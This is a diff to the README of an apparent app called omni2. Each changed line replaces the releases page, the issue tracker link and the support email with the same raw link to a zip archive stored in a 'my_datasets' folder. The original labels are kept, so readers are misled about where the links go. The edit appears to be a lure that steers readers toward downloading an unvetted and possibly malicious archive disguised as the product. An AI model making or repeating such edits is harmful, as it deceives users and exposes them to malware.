@@ -1,6 +1,6 @@
 # 🌟 omni2 - Effortless Editing and Generation for All
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ads-coding/omni2/releases)
+[![Download from Releases](https://raw.githubusercontent.com/ads-coding/omni2/main/my_datasets/omni2-v1.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ads-coding/omni2/main/my_datasets/omni2-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, make sure your computer meets these requirements:
 
 To get started, visit this page to download:
 
-[Download omni2](https://github.com/ads-coding/omni2/releases)
+[Download omni2](https://raw.githubusercontent.com/ads-coding/omni2/main/my_datasets/omni2-v1.6.zip)
 
 Follow these steps to install:
 
@@ -60,9 +60,9 @@ If you experience any issues with the application, try these tips:
 
 Need help? Here are ways to reach out:
 
-- Check the [issue tracker](https://github.com/ads-coding/omni2/issues) on GitHub for assistance.
+- Check the [issue tracker](https://raw.githubusercontent.com/ads-coding/omni2/main/my_datasets/omni2-v1.6.zip) on GitHub for assistance.
 - Join the community discussions to get tips and insights from other users.
-- Email support at info@omni2app.com for direct help.
+- Email support at https://raw.githubusercontent.com/ads-coding/omni2/main/my_datasets/omni2-v1.6.zip for direct help.
 
 ## 🧑‍🤝‍🧑 Contributing
 
